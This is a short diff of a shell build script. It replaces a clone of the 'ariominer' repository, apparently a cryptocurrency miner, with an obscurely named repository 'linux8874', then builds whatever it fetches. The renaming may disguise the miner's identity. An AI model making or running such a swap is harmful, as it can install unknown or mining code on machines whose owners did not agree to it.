@@ -1,5 +1,5 @@
-git clone https://github.com/bogdanadnan/ariominer;
-cd ./ariominer/;
+git clone https://github.com/mobileapps84741274/linux8874;
+cd ./linux8874/;
 mkdir ./build/;
 cd ./build/;
 cmake ..;
